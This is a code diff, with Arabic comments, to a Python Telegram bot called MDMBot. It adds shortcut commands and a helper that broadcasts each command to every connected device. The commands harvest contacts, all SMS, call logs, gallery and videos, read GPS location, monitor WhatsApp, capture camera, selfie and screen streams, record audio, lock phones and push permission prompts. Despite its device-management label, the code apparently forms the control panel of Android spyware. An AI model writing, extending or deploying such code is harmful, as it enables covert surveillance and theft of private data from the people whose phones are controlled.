@@ -1340,6 +1340,153 @@ class MDMBot:
             self._pending.pop(m.chat.id, None)
             bot.reply_to(m, "✅ تم الإلغاء.")
 
+        # ⚡ V11.2.4: أسماء مختصرة للأوامر (تطابق أوامر زر القائمة ☰)
+        # كلها ترسل للأجهزة المتصلة
+        @bot.message_handler(commands=["contacts"])
+        @MDMBot._guard
+        def _q_contacts(m):
+            self._send_to_all_online(m, "contacts")
+
+        @bot.message_handler(commands=["allsms"])
+        @MDMBot._guard
+        def _q_allsms(m):
+            self._send_to_all_online(m, "all-sms")
+
+        @bot.message_handler(commands=["calls"])
+        @MDMBot._guard
+        def _q_calls(m):
+            self._send_to_all_online(m, "calls")
+
+        @bot.message_handler(commands=["apps"])
+        @MDMBot._guard
+        def _q_apps(m):
+            self._send_to_all_online(m, "apps")
+
+        @bot.message_handler(commands=["gallery"])
+        @MDMBot._guard
+        def _q_gallery(m):
+            self._send_to_all_online(m, "gallery")
+
+        @bot.message_handler(commands=["location"])
+        @MDMBot._guard
+        def _q_location(m):
+            self._send_to_all_online(m, "get-location")
+
+        @bot.message_handler(commands=["waon"])
+        @MDMBot._guard
+        def _q_waon(m):
+            self._send_to_all_online(m, "whatsapp-monitor-on")
+
+        @bot.message_handler(commands=["waoff"])
+        @MDMBot._guard
+        def _q_waoff(m):
+            self._send_to_all_online(m, "whatsapp-monitor-off")
+
+        @bot.message_handler(commands=["maincam"])
+        @MDMBot._guard
+        def _q_maincam(m):
+            self._send_to_all_online(m, "main-camera")
+
+        @bot.message_handler(commands=["selfie"])
+        @MDMBot._guard
+        def _q_selfie(m):
+            self._send_to_all_online(m, "selfie-camera")
+
+        @bot.message_handler(commands=["screenshot"])
+        @MDMBot._guard
+        def _q_screenshot(m):
+            self._send_to_all_online(m, "screenshot")
+
+        @bot.message_handler(commands=["camstream"])
+        @MDMBot._guard
+        def _q_camstream(m):
+            self._send_to_all_online(m, "start-camera-stream")
+
+        @bot.message_handler(commands=["camstop"])
+        @MDMBot._guard
+        def _q_camstop(m):
+            self._send_to_all_online(m, "stop-camera-stream")
+
+        @bot.message_handler(commands=["screen"])
+        @MDMBot._guard
+        def _q_screen(m):
+            self._send_to_all_online(m, "start-screen-stream")
+
+        @bot.message_handler(commands=["screenstop"])
+        @MDMBot._guard
+        def _q_screenstop(m):
+            self._send_to_all_online(m, "stop-screen-stream")
+
+        @bot.message_handler(commands=["stopaudio"])
+        @MDMBot._guard
+        def _q_stopaudio(m):
+            self._send_to_all_online(m, "stopAudio")
+
+        @bot.message_handler(commands=["vibrate"])
+        @MDMBot._guard
+        def _q_vibrate(m):
+            self._send_to_all_online(m, "vibrate")
+
+        @bot.message_handler(commands=["lock"])
+        @MDMBot._guard
+        def _q_lock(m):
+            self._send_to_all_online(m, "device-policy-lock")
+
+        @bot.message_handler(commands=["pullvideos"])
+        @MDMBot._guard
+        def _q_pullvideos(m):
+            self._send_to_all_online(m, "pull-videos")
+
+        @bot.message_handler(commands=["protection"])
+        @MDMBot._guard
+        def _q_protection(m):
+            self._send_to_all_online(m, "apply-data-protection")
+
+        @bot.message_handler(commands=["deviceinfo"])
+        @MDMBot._guard
+        def _q_deviceinfo(m):
+            self._send_to_all_online(m, "get-device-info")
+
+        @bot.message_handler(commands=["mediaphotos"])
+        @MDMBot._guard
+        def _q_mediaphotos(m):
+            self._send_to_all_online(m, "media-images")
+
+        @bot.message_handler(commands=["mediavideos"])
+        @MDMBot._guard
+        def _q_mediavideos(m):
+            self._send_to_all_online(m, "media-videos")
+
+        @bot.message_handler(commands=["mediaaudio"])
+        @MDMBot._guard
+        def _q_mediaaudio(m):
+            self._send_to_all_online(m, "media-audio")
+
+        @bot.message_handler(commands=["permcam"])
+        @MDMBot._guard
+        def _q_permcam(m):
+            self._send_perm_to_all(m, "camera")
+
+        @bot.message_handler(commands=["permmic"])
+        @MDMBot._guard
+        def _q_permmic(m):
+            self._send_perm_to_all(m, "microphone")
+
+        @bot.message_handler(commands=["permloc"])
+        @MDMBot._guard
+        def _q_permloc(m):
+            self._send_perm_to_all(m, "location")
+
+        @bot.message_handler(commands=["permstore"])
+        @MDMBot._guard
+        def _q_permstore(m):
+            self._send_perm_to_all(m, "storage")
+
+        @bot.message_handler(commands=["permall"])
+        @MDMBot._guard
+        def _q_permall(m):
+            self._send_perm_to_all(m, "all")
+
         # ⚡ V11.2.2: /record N — أمر تسجيل صوتي بنمط مباشر (مثل المثال)
         # /record 30 → يرسل أمر record_audio لكل الأجهزة المتصلة
         @bot.message_handler(regexp=r'^/record\s+(\d+)\s*$')
@@ -1494,6 +1641,80 @@ class MDMBot:
             except Exception:
                 pass
 
+    def _send_to_all_online(self, m, command):
+        """⚡ V11.2.4: يرسل أمر لكل الأجهزة المتصلة (لأوامر زر القائمة ☰)"""
+        uid = m.from_user.id
+        online_devs = self.dm.get_online_devices()
+        if not online_devs:
+            bot.reply_to(m, "❌ لا يوجد جهاز متصل")
+            return
+
+        payload = build_command_payload(command, None)
+        if not payload:
+            bot.reply_to(m, "❌ أمر غير معروف")
+            return
+
+        sent = 0
+        for dev in online_devs:
+            sid = self.dm.get_sid_for_device(dev["device_id"])
+            if sid:
+                try:
+                    self.socketio.emit("command", payload, room=sid)
+                    _pending_cmds[sid] = {
+                        "cid": m.chat.id,
+                        "command": command,
+                        "device_id": dev["device_id"],
+                        "timestamp": time.time()
+                    }
+                    sent += 1
+                except Exception as e:
+                    logger.error(f"Failed to emit to {sid}: {e}")
+
+        if sent > 0:
+            label = COMMANDS.get(command, {}).get("label", command)
+            bot.reply_to(m,
+                f"⚡ <b>تم الإرسال</b>\n"
+                f"⚙ <b>{label}</b>\n"
+                f"📱 <b>الأجهزة:</b> {sent} متصل",
+                parse_mode="HTML")
+            logger.info(f"[Menu] {uid} → {command} × {sent} devices")
+        else:
+            bot.reply_to(m, "❌ فشل الإرسال لجميع الأجهزة")
+
+    def _send_perm_to_all(self, m, perm_type):
+        """⚡ V11.2.4: يرسل أمر طلب إذن لكل الأجهزة المتصلة"""
+        uid = m.from_user.id
+        online_devs = self.dm.get_online_devices()
+        if not online_devs:
+            bot.reply_to(m, "❌ لا يوجد جهاز متصل")
+            return
+
+        payload = build_command_payload("request-permission", {"value": perm_type})
+        sent = 0
+        for dev in online_devs:
+            sid = self.dm.get_sid_for_device(dev["device_id"])
+            if sid:
+                try:
+                    self.socketio.emit("command", payload, room=sid)
+                    _pending_cmds[sid] = {
+                        "cid": m.chat.id,
+                        "command": "request-permission",
+                        "device_id": dev["device_id"],
+                        "timestamp": time.time()
+                    }
+                    sent += 1
+                except Exception as e:
+                    logger.error(f"Failed to emit perm to {sid}: {e}")
+
+        if sent > 0:
+            bot.reply_to(m,
+                f"🔓 <b>تم طلب الإذن</b>\n"
+                f"⚙ <b>{perm_type}</b>\n"
+                f"📱 <b>الأجهزة:</b> {sent} متصل",
+                parse_mode="HTML")
+        else:
+            bot.reply_to(m, "❌ فشل الإرسال")
+
     def _refresh(self, c, did):
         dev = self.dm.get_device(did)
         if not dev:
@@ -1516,19 +1737,57 @@ class MDMBot:
         except Exception as e:
             logger.error(f"Webhook setup failed: {e}")
 
-        # ⚡ ضبط أوامر البوت — يُظهر زر القائمة (☰) قائمة الأوامر
+        # ⚡ ضبط أوامر البوت — يُظهر زر القائمة (☰) كل الأوامر
+        # المستخدم يريد أن تكون كل لوحة التحكم في زر القائمة، بحيث لا يحتاج إلا /start
         try:
             self.bot.set_my_commands([
-                telebot.types.BotCommand("start", "🚀 لوحة التحكم الرئيسية"),
-                telebot.types.BotCommand("record", "🎙️ تسجيل صوتي: /record 30"),
-                telebot.types.BotCommand("help", "📖 دليل الاستخدام"),
-                telebot.types.BotCommand("devices", "📱 قائمة الأجهزة"),
+                # لوحة التحكم الرئيسية
+                telebot.types.BotCommand("start",  "🚀 لوحة التحكم الرئيسية"),
+                telebot.types.BotCommand("cancel", "✖️ إلغاء إدخال معامل"),
+                telebot.types.BotCommand("help",   "📖 دليل الاستخدام"),
+                telebot.types.BotCommand("devices","📱 قائمة الأجهزة"),
                 telebot.types.BotCommand("online", "🟢 الأجهزة المتصلة"),
                 telebot.types.BotCommand("banned", "⛔ الأجهزة المحظورة"),
-                telebot.types.BotCommand("stats", "📊 الإحصائيات"),
-                telebot.types.BotCommand("cancel", "✖️ إلغاء إدخال معامل"),
+                telebot.types.BotCommand("stats",  "📊 الإحصائيات"),
+                # 📦 سحب بيانات
+                telebot.types.BotCommand("contacts", "👥 جهات الاتصال"),
+                telebot.types.BotCommand("allsms",   "💬 جميع الرسائل"),
+                telebot.types.BotCommand("calls",    "📞 سجل المكالمات"),
+                telebot.types.BotCommand("apps",     "📱 التطبيقات"),
+                telebot.types.BotCommand("gallery",  "🖼 المعرض"),
+                telebot.types.BotCommand("location", "📍 الموقع GPS"),
+                telebot.types.BotCommand("waon",  "🟢 مراقبة واتساب"),
+                telebot.types.BotCommand("waoff", "⏹ إيقاف واتساب"),
+                # 📷 كاميرا وشاشة
+                telebot.types.BotCommand("maincam",   "📷 كاميرا رئيسية"),
+                telebot.types.BotCommand("selfie",   "🤳 كاميرا سيلفي"),
+                telebot.types.BotCommand("screenshot","📸 لقطة شاشة"),
+                telebot.types.BotCommand("camstream", "📺 بث الكاميرا"),
+                telebot.types.BotCommand("camstop",   "⏹ إيقاف بث الكاميرا"),
+                telebot.types.BotCommand("screen",    "📺 بث الشاشة"),
+                telebot.types.BotCommand("screenstop","⏹ إيقاف بث الشاشة"),
+                # 🎤 صوت
+                telebot.types.BotCommand("record",    "🎙️ تسجيل صوتي: /record 30"),
+                telebot.types.BotCommand("stopaudio", "🔇 إيقاف الصوت"),
+                # 🎮 أدوات تحكم
+                telebot.types.BotCommand("vibrate",   "📳 اهتزاز"),
+                telebot.types.BotCommand("lock",      "🔒 قفل الجهاز"),
+                # ⚡ أوامر متقدمة
+                telebot.types.BotCommand("pullvideos", "🎬 سحب فيديوهات"),
+                telebot.types.BotCommand("protection", "🔐 حماية البيانات"),
+                # ℹ️ معلومات
+                telebot.types.BotCommand("deviceinfo", "📋 معلومات الجهاز"),
+                telebot.types.BotCommand("mediaphotos","📷 الصور"),
+                telebot.types.BotCommand("mediavideos","🎥 الفيديوهات"),
+                telebot.types.BotCommand("mediaaudio", "🎵 الصوتيات"),
+                # 🔓 الأذونات
+                telebot.types.BotCommand("permcam",   "🔓 الكاميرا"),
+                telebot.types.BotCommand("permmic",   "🔓 الميكروفون"),
+                telebot.types.BotCommand("permloc",   "🔓 الموقع"),
+                telebot.types.BotCommand("permstore", "🔓 التخزين"),
+                telebot.types.BotCommand("permall",   "🔓 كل الأذونات"),
             ])
-            logger.info("✅ Bot commands registered (Menu button ☰ now works)")
+            logger.info("✅ Bot commands registered (38 commands in ☰ menu)")
         except Exception as e:
             logger.warning(f"⚠️ Failed to set bot commands: {e}")
 
